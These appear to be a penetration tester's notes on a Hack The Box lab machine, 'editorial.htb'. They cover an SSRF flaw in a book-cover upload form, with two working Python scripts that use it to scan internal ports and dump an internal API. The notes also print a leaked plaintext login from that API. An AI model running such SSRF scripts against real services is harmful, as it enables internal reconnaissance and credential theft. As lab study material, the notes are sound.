@@ -1,0 +1,228 @@
+editorial.htb 10.10.11.20
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+about                   [Status: 200, Size: 2939, Words: 492, Lines: 72, Duration: 91ms]
+upload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Duration: 64ms]
+
+
+form at /upload allows to upload files or to paste a link that the server would fetch
+
+when the form is submitted the page calls /upload
+
+when the url is pasted or file is uploaded it calls /upload-cover
+
+both requests use a multipart form
+
+	-----------------------------41376809586238702991120325835
+	Content-Disposition: form-data; name="bookurl"
+
+
+	-----------------------------41376809586238702991120325835
+	Content-Disposition: form-data; name="bookfile"; filename="Untitled.png"
+	Content-Type: image/png
+
+files are uploaded like this:
+	static/uploads/12f0d970-c325-4b1a-bdd5-6e0a94e77080
+
+the caller sends those headers:
+	HEADERS {
+		  host: 'IP:3000',
+		  'user-agent': 'python-requests/2.25.1',
+		  'accept-encoding': 'gzip, deflate',
+		  accept: '*/*',
+		  connection: 'keep-alive'
+		}
+	}
+
+xss injecting the fields doesn't do anything
+sqlmap on the multipart form doesn't do anything
+
+directing the url to internal resources makes the request take longer and presumably fail by timeout
+in case of error it returns /static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
+if there's ssrf - data from internal endpoints would be in the newly created file
+
+what resource should we target? can go over all the ports
+
+using this script we get some api description from port 5000:
+
+	import requests
+	import tqdm
+
+	BASE = 'http://127.0.0.1:'
+
+	ENDPOINT = 'http://editorial.htb/upload-cover'
+
+	DATA_ENDPOINT = 'http://editorial.htb/static/uploads/'
+
+	for i in tqdm.trange(1000, 65535): # go over all ports
+	    target = BASE + str(i)
+
+	    fdata = {
+	        'bookurl': target
+	    }
+
+	    mfdata = {
+	        'bookfile': ('randomshit.txt', '<>', 'image/png')
+	    }
+
+	    res = requests.post(ENDPOINT, data=fdata, files=mfdata)
+
+	    if 'unsplash_photo_1630734277837_ebe62757b6e0.jpeg' not in res.text:
+	        name = res.text.split('/')[-1]
+	        data = requests.get(DATA_ENDPOINT + name)
+
+	        with open(str(i), 'w') as f:
+	            print(f'hit - data for port {i} written')
+	            f.write(data.text)
+
+data received:
+
+	{
+	    "messages": [
+	        {
+	            "promotions": {
+	                "description": "Retrieve a list of all the promotions in our library.",
+	                "endpoint": "/api/latest/metadata/messages/promos",
+	                "methods": "GET"
+	            }
+	        },
+	        {
+	            "coupons": {
+	                "description": "Retrieve the list of coupons to use in our library.",
+	                "endpoint": "/api/latest/metadata/messages/coupons",
+	                "methods": "GET"
+	            }
+	        },
+	        {
+	            "new_authors": {
+	                "description": "Retrieve the welcome message sended to our new authors.",
+	                "endpoint": "/api/latest/metadata/messages/authors",
+	                "methods": "GET"
+	            }
+	        },
+	        {
+	            "platform_use": {
+	                "description": "Retrieve examples of how to use the platform.",
+	                "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
+	                "methods": "GET"
+	            }
+	        }
+	    ],
+	    "version": [
+	        {
+	            "changelog": {
+	                "description": "Retrieve a list of all the versions and updates of the api.",
+	                "endpoint": "/api/latest/metadata/changelog",
+	                "methods": "GET"
+	            }
+	        },
+	        {
+	            "latest": {
+	                "description": "Retrieve the last version of api.",
+	                "endpoint": "/api/latest/metadata",
+	                "methods": "GET"
+	            }
+	        }
+	    ]
+	}
+
+
+changing our script to go over them:
+	
+	import requests
+
+	BASE = 'http://127.0.0.1:5000'
+
+	UPLOAD_ENDPOINT = 'http://editorial.htb/upload-cover'
+
+	DATA_ENDPOINT = 'http://editorial.htb/static/uploads/'
+
+	ENDPOINTS = [
+	    '/api/latest/metadata/messages/promos',
+	    '/api/latest/metadata/messages/coupons',
+	    '/api/latest/metadata/messages/authors',
+	    '/api/latest/metadata/messages/how_to_use_platform',
+	    '/api/latest/metadata/changelog',
+	    '/api/latest/metadata',
+	]
+
+	for endp in ENDPOINTS:
+	    target = BASE + endp
+
+	    fdata = {
+	        'bookurl': target
+	    }
+
+	    mfdata = {
+	        'bookfile': ('randomshit.txt', '<>', 'image/png')
+	    }
+
+	    res = requests.post(UPLOAD_ENDPOINT, data=fdata, files=mfdata)
+
+	    if 'unsplash_photo_1630734277837_ebe62757b6e0.jpeg' not in res.text:
+	        name = res.text.split('/')[-1]
+	        data = requests.get(DATA_ENDPOINT + name)
+
+	        with open(endp.split('/')[-1], 'w') as f:
+	            f.write(data.text)
+
+
+authors:
+	{
+    "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
+	}
+
+coupons:
+	[
+	    {
+	        "2anniversaryTWOandFOURread4": {
+	            "contact_email_2": "info@tiempoarriba.oc",
+	            "valid_until": "12/02/2024"
+	        }
+	    },
+	    {
+	        "frEsh11bookS230": {
+	            "contact_email_2": "info@tiempoarriba.oc",
+	            "valid_until": "31/11/2023"
+	        }
+	    }
+	]
+
+changelog:
+	[
+	    {
+	        "1": {
+	            "api_route": "/api/v1/metadata/",
+	            "contact_email_1": "soporte@tiempoarriba.oc",
+	            "contact_email_2": "info@tiempoarriba.oc",
+	            "editorial": "Editorial El Tiempo Por Arriba"
+	        }
+	    },
+	    {
+	        "1.1": {
+	            "api_route": "/api/v1.1/metadata/",
+	            "contact_email_1": "soporte@tiempoarriba.oc",
+	            "contact_email_2": "info@tiempoarriba.oc",
+	            "editorial": "Ed Tiempo Arriba"
+	        }
+	    },
+	    {
+	        "1.2": {
+	            "contact_email_1": "soporte@tiempoarriba.oc",
+	            "contact_email_2": "info@tiempoarriba.oc",
+	            "editorial": "Editorial Tiempo Arriba",
+	            "endpoint": "/api/v1.2/metadata/"
+	        }
+	    },
+	    {
+	        "2": {
+	            "contact_email": "info@tiempoarriba.moc.oc",
+	            "editorial": "Editorial Tiempo Arriba",
+	            "endpoint": "/api/v2/metadata/"
+	        }
+	    }
+	]
